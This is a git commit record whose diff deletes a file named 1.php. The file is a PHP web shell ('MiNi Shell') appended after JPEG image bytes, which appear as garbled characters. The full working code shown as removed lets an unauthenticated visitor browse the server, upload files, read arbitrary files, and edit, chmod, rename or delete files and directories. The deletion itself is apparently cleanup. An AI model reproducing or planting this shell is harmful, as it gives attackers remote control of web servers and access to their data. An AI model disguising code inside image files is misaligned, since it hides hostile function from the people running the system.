a992cc1b032ef29a7153958b361d3fd078f0d468
Alaich <rmalaichuk@gmail.com>
2021-05-10 13:57:22 +0300

    Delete 1.php

--- 1.php
+++
@@ -1,358 +0,0 @@
-яШяа JFIF      яЫ „ 	( %!1!%)+...383-7(-.+
-
-
-
--% &5/------------------------------------------------яА  ·" яД             яД ;     !1AQ"aq2Ѓ‘Ў±’БСр#3BRrбсb‚ІяД             яД *       !1"AQa2qр±Б#BЃяЪ   ? yR“њd&vGlJwZРvKо)АYrxрЊBҐІк—#j]ZиA•ЧБT^ЃЩdptи{Ї[w kWSФ‹*QБКaиy¤ґјBbлm№*ќ  &Чфч0Вх<|0pь’њљfЕ·M`‘М¬эЌш
-^.qЭя R‹рЅ¬·Њ¬^EYTфFЫГ­Ёw<-.‘j)ЎMН-/љs	yqTЙБшф»'&ЫЮF‚Kz-(ЌЄџЩ[lКЕгшјЦ‡ґ¶МЭНЖцбў<“БGЦТЪ$ЋЉwќm€ј2З*e “ифZ(цY-FпОбЖVћѓҐѓЩenмж«§єlнТ µD¬¬wТЇ©H4БFXє1
-ЅVЧsIOqSBЫЎNzJц“KzJОѕ•cXµО%ЈЂµvZcњгт•FSuMєЩ–ј%­†хBЩЄЦґРС##ъВП\[%ЌсђyY Ск‰…¤!ўVТД‚О1ЩЋRЭIеј-NsZЄІJ†LTНAдђтP®ЧћQ:yЧґІg”_g=™›НМ	mНжцДэЦЇY¶ј¬e+Hyj”e‘!EµЙcЭёаў®µSoХ{Ґ€ѓЧ¬*®h g<Ґ@ЎK‚I$юW+†‘Wэ'м№_”>ГДэ
-lНБUs¦1АЎ,ЇЂo*Кє§Eлї.U"N&CTіu7Иь _0вV’ъ°yКH,Бq ,Й)ЙРЛHжгІЈвЈ5<µЩбцt;r‹hnЖz%аЭ“Хz+4і§КiЫё)­ЅХP6п+F>0TРІ‹`љцЏслђЮ&бiф}ShћЙnђя ?™ikЬЂХџЙИ§ґҐ@хmБАUSУLбFО·’Њ©ЁђhтєЅ_eЋ¶ЪЯr
-тЁiе_qt]MYд»hя qюЬсЈВ9®LaJрpPѕђЧџ€ЯvкЂЎ\е"z·Ўо[лиV‚Ж¬В¤вІ*a§†ZMoоА=ПкW›kpџS§pію §жђш\QhЙMІйАКbЛ’жДYюH=Ь’Ѓ€кmЃЈЫшЄ`с№C”€JtйийНЮс•цµи8o…FЈp]ЦйЙ>‰pҐPр1ЪF>‹n8(*Љ›ЫaЪ€љ.цYХЭ‰[‚iћЅЦTШ№Ћ’ JГзЕтM!сЊфлxћЫ]нВЙХФ¶aJЫSћW›ІиЫТјЬ©ё`yКПQФ`*кkEҐ#nѓN­ЏkZ·ўKwєћA_Ї7’~И©
-ОЃВЗйJчРЌЩ;Лч№ё-2§ћКqRxYk—Т=UЦЦЂв>ФZqшThv@Ф.wСc{#&@ь#l®;D$”kGGмТvz/«7[Pу+”i”ж3СnIlК`nrРbmЇњЇQi“%}rAVй—PмрT*SЭПСFЈ`{'двн±нжЧ6RЦX46PФ®•‚тp™здє(¤і3WТ…Uх\a*є7Ќ7lq‹^„rTЄвЬ$vs2ќ±ш…MUШ%*Е§+«\uQѕ ‚–XVЬиHы •Й!љ4t*Hgиію"¬Zм±®Њщ‡сJКX+RэVАUд‰цн+ЮЊ]PђiJМэѓ©T  XоАщIф=
-Эi–ЮPO=љIҐиНaђ3лВХ[¶СuШ™т&й2љЌZ@тЄ.*ЊЃБЃSZњ‚®
-("Ф)µѓs€Ђ8Yєъ©/ юБ цЊЏ¬-FЇh я ЪOcЈЂвв=ъ@ќ·HјR¶lЧПвѕЬP‘”Ypэ!wr?-Ґ±±цdu«gN…L­эpBН1‡yмW–¶Ќ•HyoPѕ\С•тСЂiHЦґ,єЭЩђ0aЎЫмU·L.•Yy`µL•S°лЫњ,ЅэоHZz!ВJQ«iНщђ‹V¬«Mўb{Ј(Ю €ЋtЪ
-<)^Qi’’_»`ю:ф№р
-д}8Щ±ш9_.)a[kSrѕйў> ;wИWU§<Ўhѕ
-.Ѕ\z …H	Ж0”ЫRҐLrUwBєЙЦЄ!Vј*ЄЬ%·U‰бhuirУ®]ЋrВ¦rљР№ „eZ‹uRаГ%e-х*Баb`
-ЕЈлOСnоЁУ>Ў#рцњM^#iзщvTсвЬЋЧlЩiґH¦ЭС1льQm`лиc Uµё+и!2Й’§IXіР%єЦіNЪ“ЄФ;ZРI$?ўЈb$ШЗв(9лПя ђ¦Јf›…2аЧZВаKe гј­­ЌqUЎн8IОЗб[Uѕґ)9«!гmhЫ1Ўў^NБИ0	гІ•Јf’№•_ВоІюсЃє;ВЧ†µр2ТЧHтњЁѕFF©'ґ€4b!
-yBGH_jС‚ЂФp'?uџЙiБЪbQ¤
-љT„#И•ТЊЧС¬ЄS©X5gнк”ЬЮ’SF64Scjw‚U…`xI]sAы№M(5ATЇHА_+Хs±
-0ф^ЩIB++§h@_YjвsВpЗ0„{°UЊв‹@Gђџ·Ћлђа- Ѕ:кхоҐ*·ЎХ}ё©	ҐшTЮ‚MH*ЗЦ”Ґ·2оQцХ’С: єoЬ@	ђСw5(Я°Кua­‰ь+aЗ	~жw[3WЦ›€(ђРґХPуеYлЄ„rF1•E‰КБ)Ч3ЂXЧ„Ўм­TmЅЁеIЙҐFІќq±§TШт~Аz ®*ЊуI»љЂsџи*б’жё…WЙґ¶a0Qмj®ЃАђ¬%{сTЊЌЫ.Ю…ЅўЧґ±нc„z©6§u6Ц„ЭЃhЛ;АЦ¦8Ђd9Д7эЅ–ЋКЭґШС +Ю•xЉьР·sЫИЃ&LI‚JT’)КR¤0}fП }P®џJбђцµаdp`…д_ЪpъХ)–—ЌЫЙ™вg·(ќЕ•tZЮЖ 'ПёЂqЗU74Н§iZ{=MТhЫПБdьЗ$џ©Lћ|° *ЖUUn·&¤ЊН¶p¦HYќJйЫ‹Эj©/вЄ@9®XьИ?NСlќЬѕHY§xЉґ”nЈЁЌ„uXЪ–„ФЬA…згЖћЩи8ьjљ†ю
-«а»ІЄЭЂ pќQ¬ВФК4;Ќ*3хi™MlZ6 ®зw
-Єа™ЖИµ±›№PЄ	Sіhr!–Э”шњаDT7/†ТЎЙПІigD“>§j KAXѕМ3¬jv+–ФРђШЯ§ЏШІам#©_=Пт¦z–¶ЮTm‹ЖжВ¦<U¶fЉШ=­Бњ¦V·ЫL”ЁР-vQ4А=WJ)‚V9vЄЧaI—Б§”ІЪД2€№µ Jџ¦ЁPЪ·г™@ЬкЄ¦цВЇЛ+–4Ћвg~uВТХU*йB^]@ Џє+;Ќџ+лв§АVыЬjї‘†ЏXеyНZа/Bя Ж•w.q>ҐР>ь}ЇTЦЃ<|agўґ®{ПEр*ЮюЛЦі%Љ„њ…љЦ5z–µ›W.ўHhё~a–њ%ъќ‹j±Н"eґ4i=Ќ™vЧ±Їi8аѓђRЌzіM75ЩiЋ±ЦџfгEгu6ёМ4Бщ\СХ§Ёиeвo0°ь0зdЋ Hйџ§ЭrИЄКz2дeu·ФlµїбЏH$tЋQ>eOЉЗФ$µ¦@<Iаэ¬ЮЈв:Џ–†5Ј<‰?Йc®W
-КDЃЃ'ї8Yн'lЦжЪЈЫ«]H–ћF©ЗEтО™ЂYў=О¤НЭЃO)є8Lџ7f&ёи!®…—с…~&V¦™”ЇYўВб»ІO%µЊ·Љ“Иy…JЗw€шov6;чJфїйVдо-i>±…«ЈBђА
-ь/?“ш=Й#ВЩ¤ЦЗ•ЯPSЅ/В·.iЏPЅ¦•Ѕ28sй4vOЖuz3zсѕ™жTј&за¶
->—ЂZ2гц[–0+н[†р•#ћFЮ‘Ќ¶р]!Й(пмЕ(Ѓ!>s`r’ЬjeЋд(Ґ'Р|,й)‹,Гy@\ш‹°ы¤ъ‡‰њpР–’“йљп‚ЯEЛэ ?й?uЛ№ЎyWV‹·щЋ%8mЕJђ„№ёi ЋЉw: u=¤-2‹dЈTмгSuGL+mк<М*иЧ¦1…чц‚г asЌг&5µХsЇ«ЁжuФ\ЧpУhЊ¤аѕЖѓ
-qСYL‚Ці>Y(‹PKўе”i—;арUЪ•Фp .¶±.!i,и5­‡4$IцUEGLНРРXrж§юЁЪUE6m ъ	ъ»•UеИ ГJC¤Х?ґґзжЄ¶%4Б•ББЈЧнЃAЋЖTчЇ]I]FЎш>ЉЧ№Pа9+‚eјe¤©Ѓ"AкiеҐdфЭ!Ї§Wk|ЃМt–пђDv–/O¬рDѓСc/,џo]ОiХ"HИI ћђHQгЖ_ѓn–ёіsб©pv"b и}}К&ПГб¤Iк:pИџUЈЅБ-_)‰UxЎ$lЋ:fЄЪ Й•(I,Эеoxўinе8*G“>ГЊэKG}RЪЂв8FrajЁЩ·hЋ !’*za„њ]Ј lx%§РВбEэVіRТЪGYZНшoЪWџ›§·С®мѕЪъжЂаB№єеXуr­ґё¦љ{[ФёЉd,т–ґtжы
-єсEq†Ѓ	]З‰+у№
-N¬т†})0‚“щBЗ,‚Єш®нНЪЋрe
-iqT™{Оz+¶µЄ«‡O	ћBП2‰eеB89CЪѓ9©ЊеYыkZЙтySiўу@њВд/я (W)ъd^UцfjiВ0cHЬ!hиЩmщ‚-”ЪЎкгwBъЇаЖ7CЫ”ЖЦ›X$ЃхZo†И)Eэ F3”VZqmХ)’!wUЇщxM4н9µ<§
-къ3Y .хqDйf“Ыйцдz„m|М&T  Њ¬Ю"}—•иљИы°{*оiбh­«¶Ј&2і6чм¦6· U9щ*­ <®_#
-Ф7ґВMeiѓёКu^пh-оЊР-ZкНtLпбьSbП)НDVЌZH*П#Щ5ЁU©ЇiўVP+aSRIВЄв‘!џpжЊ¤c¦ж5g#ђЃєЅЃ’zМt@ЫкНy€pчфHдЖР=э‰Эе‚{•{Ђ#0dџА…нN¦в)УцqпћќёWЫTЄа	kA<ДВџ)/“Rт§T8¤ D1э’к4Юy	ЌЅbЫ2°л^лOўW––ћњ,Э&Bcc[iVгўiмСVd…ќЦґ–ФїCЩ<Ґp_\Щ
-tћ™VЏЦн+Тqk·ф9„ћќSХ{uЦћЧsA©я „иT»]…—'‡уM¶ЮП9Ґ\…цҐСњ-[B©EЖd	ы ю0YeУ+ґ‚џX‘%nЈЄ…0HКЎф”Ьl›m…ТЅ!Ющ*–У…{9]юEMі·®_&вqи6:hё{ЫАhЊ$Х4З1пc§КHћћкъГиn-09”%?@vс$ЋЇe–Ы®Н‹ѓtИТ§Ц	КІм5­&P¶zЖL6AК¶ЮеЋ$?DНZЩУPбv§°nЭЫфSѕ»i”фК¬Rs~_4я ©a·"¦yеrЋ€9{Pя x—\T3 !окёђР‰‡@„qБv+jАjUМ…uЂd<Є+R2«{a<ўЁ‹»УФ77+Wа[РтсХ лр°4)I+Uя Џl^j:Ё$0=њVЏХL)ћ€JҐБL…/jО ZФТлє2W ®ћ(@э>JЏя '„чhRшh( №1K4с#љV`pЌЩђTљШwє<јЂ©1і{Ј)СXыPr9RcІ
-4ід)Sr¬ы© Џgto\„тЩтYП„~•©
-”–КЕиxьєщ°d"jЬO:хЃЊA!7€Ёµф‹€’т+љEПЬ0%{M'‰ѓЗTі^рЕ“ІиІЎд`rЪмт¶=ЬE*›LК7QТ]AРо{ЋЁ]‚A<Ї5Л‹©.Ћ‹}<Б‚9_KЂ (еДИфQ©LµҐз9FХРЌы©sД®C9Аж!r‰тЮФpiмїT±п0Їјёq’С!ІHп ё Т\@а™Ь©B>ЫFћц†6Ч 4гЫє6О‹Є0ё4“ПІ^П#ҐВЭ>Р/@¦йtyЂЏB‘¶Ы]єУ*љДёpІ¶М6Ў&<СџDP¤Ч9Рб—џ¬atM'Т >З	bЪмЄ— wРIХ!ЬЃ€V^ЦtфзNЁ!оЋ6=иFЧDЄЬ†‚9*?О
-q¦6фhё8ј‰
-ЫЌ
-{‘’%WoHoNф.э“lз€^—б»}”"1+ҐУuJЊ;ЁИrЅ&› иЅ/IЙ“љKH“ђп*З№Pч-в№ИJЩ3Р+Є9
-ъ’ии2Ќ µд ѕ5тw5я ЏбI•dc„Wg0ъn}UҐіц@Т2 #Ђ0‹iv›и…і€ђz/•^Ґњ…ЖѓOR¤Ы}IvV2¬jъ(ЗtB1)Є{чѕ™ђS‹№"BЕш·\ih.ѓАЗРЛIXbЖ¶:нG»nбЂI“Аж•вFХ.ѓйф^aЈЭ?а>®~!k'Ю'фT[ЭЧўж‚93фЦfя ‘ЯH<®ПH»с>ЪlкNРуЦDHъеҐл„Х;ќ;ЪsЂg-Ђ@ъ,
-JЈИOџsэ~ЉЗSs^H ћ'"#tцю§мЊ»=«Щ^ ¤@'њфХW~ўAp'oTЌъ¦Ъ­{FЩ†ИМґ1ь¦Пс#'cЋЬ>„ѕкњЎ?ЭFЉЈ­йў…B	хХL№М,и2~я т‰ЧЄп-sќ2`ъ aHQm:F^jЖЮбЈ&~°јщЖ*N‰Е«v+{sВеkД‚№$ёїўFђ~Ш’ '#kьЬО«Ns›эЩ—	тDн9чPј»qhhБkҐ c tы¦ЇФ·±”бћF’Io4‰ЎM=SијgIЎuиџ`F=#ы}ЧZЮмi'‚cрЃuлП»І!Рк}+‹CZIџ7ёытЏNЕu ЪЕ¤IБМсe1ЈXTа ЁЌмxЩГCЫ·hЪбуcЦcю•џ”7ЅЋ‡чlл?ыzЎiЏ‰®ЮКYДОЬд ©7Пжж:ЏEй>рkЄ0VЇєђxќ‘зОypтэ§Щmмј?kKдЎNGщ‹CќыО’­‹Е“¶хapмс{=жѕiУ1<њ6=ЦЛIріЄрOVЃ#о·WеЌ ШY=SX†Џ„C‹ЬЮўfц э–ЬxсЕl4в»[Qe1hСX+ѓБ¦^ЙIё<Мя ЗР tzБџ<ЧyэаТµ9SBкФC=сЙC~Ше.Хµ:Ѕ­>ЗџС;j¬Aхл%Хn¶»=qч@ЭjЃ§'їаJ¦МTё|УnжЂaТ$ъы~Ё·BїБUц°Ц9ҐШ‚dzu)®ѓѕїшm%§‡glw”n™бљX¶«ыLУ`ЂЮ№њ•¦§W`° г°ќ”ЦA”м¦ПHЃМёдџлў™gEu[П,“пнХ'°Ѕ%…о1ЅОpЈf?tоJ	ЫШО–‘mГc…[\ЈZ°кyJЇхvСnг$Hl'Ї<+5[b]иvѕ’“
-eЋfцАsРЃЮ
-
-Я^.&2ыщЊыyOЭ/8¦•ЃЋЇ+µЈ$x©+ЛхzЏsЛ§КCЖЮ'лУтџ^кeХюf·ЂМAЙЭ+Ъ­sћу–зO nЋ±Дњыz,ћFU%HU&•h ЉЌЃ»fGRNйж“ҐУ{Nч“$ЗНАk}92‚·kѓ`Gn8н<сК®гsdрH01ђ>b{{+[°Жk—_ЙFЎ@KЂpkвпqV„~‘sрьрd‚ЏтЖyъ%П¦wK„тЏ`ЁИD‹‡! њђNТ}N#)xШ9nЖwµ@7™щyаы4 *\
-ќО—°$sцR©\™xгtsйЯш Ќ3јА0`O<пА0»иm­~‚‰%М<ќЭx#iя ”KЋЗд“ґ=	1ъ!›Ks[. q“ё7=уEтҐF¶"hЎЬМю
-Nh	ТЇ¦=О.~нЗ'i†ъ ;BдФњyp¶ицДц\“ЊюРЬгфRiy±;w`OCЯЧЋкЦ—4»wщЂ&8‚иn=	_'”W!в­YUvQБН°‘aАрOС7У<<kє“@аyЃ.as¶зЈ„Ђ>џUЛ“5о_Н’mљ
-ГґЕЗВЄвн· иАs:Џђ:­•о…kBЦ«нйЌФЖрг.tСpvмЊ·ўеЛ\RЉТы)Ґ3­в±п¦жЫVњсиј§q€>‡Щќj»'ћ±Эrеў-»(dЇuАщ @Э9Ъsъ…”·©5ч`;iaЄЩqћѕoя ErеЋY$шїэ{iЇ.Z(ФРЏЮя ґў•Бs^А!РЧъyCПѕХЛ“JoKщя bХИчQЫUа™ћЧП°ЂЅЅ{©БТжд™Џ›УеаЇ«—eЙ.-r|X‡фWХ¬УYАТkZоeО0AЖGЩlu­IґнЙ¦v’d7€ q—-jЬEя кfЫ­љtз4‚чєЊїqи“+]t–d_§+—%Њ›A‹ц"z– M2ЬщњЪxя ЫlюҐвq–фч»еn  ы ѕ®VЖыdЯfыU^ијQa†‚DёIй?Ф+©ЮViЫ\П™‘LЮG9бrе—>Y«¦	{eHлU¬ЧББqp )=щДsЭYktг,€s1ш!rе,Ќ¶¬lЋй„› ъu#ґърбI$-іњЦђв2A=AМхш\№J]&gнXЖ›<ЅПіЯnЄцНsљ_QЫАџ(Ћ8МсћЛ—#)4ђqйY~ВВжѓ$'3"'феUYНcI‚v·‰Ђ	sї ю.Kо Oч!{хЃ,Ъѓ€‡ЙЋЩц(ъ$ЊєLћ¤I‚гФя  №r¦D”uця ЙLЪ_Я°‹
-CiЙ'ЌІ»џtЫИ{љ2LЗ;±ъ®\¤Яµ—Г7@фЭкHюK—.Z)4яЩ<?php
-set_time_limit(0);
-error_reporting(0);
-
-if(get_magic_quotes_gpc()){
-    foreach($_POST as $key=>$value){
-        $_POST[$key] = stripslashes($value);
-    }
-}
-echo '<!DOCTYPE HTML>
-<HTML>
-<center><font face="iceland" size="10" <font="" color="Mehroon">Devil Killer Is Here</font>
-<HEAD>
-
-
-
-
-
-
-<link href="" rel="stylesheet" type="text/css">
-
-<title>MiNi Shell</title>
-
-<style type="text/css">
-<!--
-body {
-background-image: url(https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT3_4RPalvAmdF6IsRMuOtBsQHcEsfUd71OyIktrTFh4_1TLRK5RA);
-}
--->
-</style>
-
-
-
-
-<style>
-body{
-    font-family: "Racing Sans One", cursive;
-    background-color: green;
-    text-shadow:0px 0px 1px #757575;
-}
-#content tr:hover{
-    background-color: #636263;
-    text-shadow:0px 0px 10px #fff;
-}
-#content .first{
-    background-color: silver;
-}
-#content .first:hover{
-    background-color: silver;
-    text-shadow:0px 0px 1px #757575;
-}
-table{
-    border: 1px #000000 dotted;
-}
-H1{
-    font-family: "Rye", cursive;
-}
-a{
-    color: #000;
-    text-decoration: none;
-}
-a:hover{
-    color: #fff;
-    text-shadow:0px 0px 10px #ffffff;
-}
-input,select,textarea{
-    border: 1px #000000 solid;
-    -moz-border-radius: 5px;
-    -webkit-border-radius:5px;
-    border-radius:5px;
-}
-</style>
-</HEAD>
-<BODY>
-<H1><center>MiNi SheLL</center></H1>
-<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
-<tr><td>Current Path : ';
-if(isset($_GET['path'])){
-    $path = $_GET['path'];   
-}else{
-    $path = getcwd();
-}
-$path = str_replace('\\','/',$path);
-$paths = explode('/',$path);
-
-foreach($paths as $id=>$pat){
-    if($pat == '' && $id == 0){
-        $a = true;
-        echo '<a href="?path=/">/</a>';
-        continue;
-    }
-    if($pat == '') continue;
-    echo '<a href="?path=';
-    for($i=0;$i<=$id;$i++){
-        echo "$paths[$i]";
-        if($i != $id) echo "/";
-    }
-    echo '">'.$pat.'</a>/';
-}
-echo '</td></tr><tr><td>';
-if(isset($_FILES['file'])){
-    if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
-        echo '<font color="black">File Upload Done.</font><br />';
-    }else{
-        echo '<font color="red">File Upload Error.</font><br />';
-    }
-}
-echo '<b><br>'.php_uname().'<br></b>';
-echo '<form enctype="multipart/form-data" method="POST">
-Upload File : <input type="file" name="file" />
-<input type="submit" value="upload" />
-</form>
-</td></tr>';
-if(isset($_GET['filesrc'])){
-    echo "<tr><td>Current File : ";
-    echo $_GET['filesrc'];
-    echo '</tr></td></table><br />';
-    echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
-}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
-    echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
-    if($_POST['opt'] == 'chmod'){
-        if(isset($_POST['perm'])){
-            if(chmod($_POST['path'],$_POST['perm'])){
-                echo '<font color="black">Change Permission Done.</font><br />';
-            }else{
-                echo '<font color="red">Change Permission Error.</font><br />';
-            }
-        }
-        echo '<form method="POST">
-        Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
-        <input type="hidden" name="path" value="'.$_POST['path'].'">
-        <input type="hidden" name="opt" value="chmod">
-        <input type="submit" value="Go" />
-        </form>';
-    }elseif($_POST['opt'] == 'rename'){
-        if(isset($_POST['newname'])){
-            if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
-                echo '<font color="black">Change Name Done.</font><br />';
-            }else{
-                echo '<font color="red">Change Name Error.</font><br />';
-            }
-            $_POST['name'] = $_POST['newname'];
-        }
-        echo '<form method="POST">
-        New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
-        <input type="hidden" name="path" value="'.$_POST['path'].'">
-        <input type="hidden" name="opt" value="rename">
-        <input type="submit" value="Go" />
-        </form>';
-    }elseif($_POST['opt'] == 'edit'){
-        if(isset($_POST['src'])){
-            $fp = fopen($_POST['path'],'w');
-            if(fwrite($fp,$_POST['src'])){
-                echo '<font color="black">Edit File Done.</font><br />';
-            }else{
-                echo '<font color="red">Edit File Error.</font><br />';
-            }
-            fclose($fp);
-        }
-        echo '<form method="POST">
-        <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
-        <input type="hidden" name="path" value="'.$_POST['path'].'">
-        <input type="hidden" name="opt" value="edit">
-        <input type="submit" value="Go" />
-        </form>';
-    }
-    echo '</center>';
-}else{
-    echo '</table><br /><center>';
-    if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
-        if($_POST['type'] == 'dir'){
-            if(rmdir($_POST['path'])){
-                echo '<font color="black">Delete Dir Done.</font><br />';
-            }else{
-                echo '<font color="red">Delete Dir Error.</font><br />';
-            }
-        }elseif($_POST['type'] == 'file'){
-            if(unlink($_POST['path'])){
-                echo '<font color="black">Delete File Done.</font><br />';
-            }else{
-                echo '<font color="red">Delete File Error.</font><br />';
-            }
-        }
-    }
-    echo '</center>';
-    $scandir = scandir($path);
-    echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
-    <tr class="first">
-        <td><center>Name</center></td>
-        <td><center>Size</center></td>
-        <td><center>Permissions</center></td>
-        <td><center>Options</center></td>
-    </tr>';
-
-    foreach($scandir as $dir){
-        if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
-        echo "<tr>
-        <td><a href=\"?path=$path/$dir\">$dir</a></td>
-        <td><center>--</center></td>
-        <td><center>";
-        if(is_writable("$path/$dir")) echo '<font color="green">';
-        elseif(!is_readable("$path/$dir")) echo '<font color="red">';
-        echo perms("$path/$dir");
-        if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
-        
-        echo "</center></td>
-        <td><center><form method=\"POST\" action=\"?option&path=$path\">
-        <select name=\"opt\">
-	    <option value=\"\"></option>
-        <option value=\"delete\">Delete</option>
-        <option value=\"chmod\">Chmod</option>
-        <option value=\"rename\">Rename</option>
-        </select>
-        <input type=\"hidden\" name=\"type\" value=\"dir\">
-        <input type=\"hidden\" name=\"name\" value=\"$dir\">
-        <input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
-        <input type=\"submit\" value=\">\" />
-        </form></center></td>
-        </tr>";
-    }
-    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
-    foreach($scandir as $file){
-        if(!is_file("$path/$file")) continue;
-        $size = filesize("$path/$file")/1024;
-        $size = round($size,3);
-        if($size >= 1024){
-            $size = round($size/1024,2).' MB';
-        }else{
-            $size = $size.' KB';
-        }
-
-        echo "<tr>
-        <td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
-        <td><center>".$size."</center></td>
-        <td><center>";
-        if(is_writable("$path/$file")) echo '<font color="green">';
-        elseif(!is_readable("$path/$file")) echo '<font color="red">';
-        echo perms("$path/$file");
-        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
-        echo "</center></td>
-        <td><center><form method=\"POST\" action=\"?option&path=$path\">
-        <select name=\"opt\">
-	    <option value=\"\"></option>
-        <option value=\"delete\">Delete</option>
-        <option value=\"chmod\">Chmod</option>
-        <option value=\"rename\">Rename</option>
-        <option value=\"edit\">Edit</option>
-        </select>
-        <input type=\"hidden\" name=\"type\" value=\"file\">
-        <input type=\"hidden\" name=\"name\" value=\"$file\">
-        <input type=\"hidden\" name=\"path\" value=\"$path/$file\">
-        <input type=\"submit\" value=\">\" />
-        </form></center></td>
-        </tr>";
-    }
-    echo '</table>
-    </div>';
-}
-echo '<br /><font color="red"></font>Creat By <font color="white">MiNi SheLL</font><br />Email: <font color="white">jattceo@gmail.com</font>
-</BODY>
-</HTML>';
-function perms($file){
-    $perms = fileperms($file);
-
-if (($perms & 0xC000) == 0xC000) {
-    // Socket
-    $info = 's';
-} elseif (($perms & 0xA000) == 0xA000) {
-    // Symbolic Link
-    $info = 'l';
-} elseif (($perms & 0x8000) == 0x8000) {
-    // Regular
-    $info = '-';
-} elseif (($perms & 0x6000) == 0x6000) {
-    // Block special
-    $info = 'b';
-} elseif (($perms & 0x4000) == 0x4000) {
-    // Directory
-    $info = 'd';
-} elseif (($perms & 0x2000) == 0x2000) {
-    // Character special
-    $info = 'c';
-} elseif (($perms & 0x1000) == 0x1000) {
-    // FIFO pipe
-    $info = 'p';
-} else {
-    // Unknown
-    $info = 'u';
-}
-
-// Owner
-$info .= (($perms & 0x0100) ? 'r' : '-');
-$info .= (($perms & 0x0080) ? 'w' : '-');
-$info .= (($perms & 0x0040) ?
-            (($perms & 0x0800) ? 's' : 'x' ) :
-            (($perms & 0x0800) ? 'S' : '-'));
-
-// Group
-$info .= (($perms & 0x0020) ? 'r' : '-');
-$info .= (($perms & 0x0010) ? 'w' : '-');
-$info .= (($perms & 0x0008) ?
-            (($perms & 0x0400) ? 's' : 'x' ) :
-            (($perms & 0x0400) ? 'S' : '-'));
-
-// World
-$info .= (($perms & 0x0004) ? 'r' : '-');
-$info .= (($perms & 0x0002) ? 'w' : '-');
-$info .= (($perms & 0x0001) ?
-            (($perms & 0x0200) ? 't' : 'x' ) :
-            (($perms & 0x0200) ? 'T' : '-'));
-
-    return $info;
-}
-?>
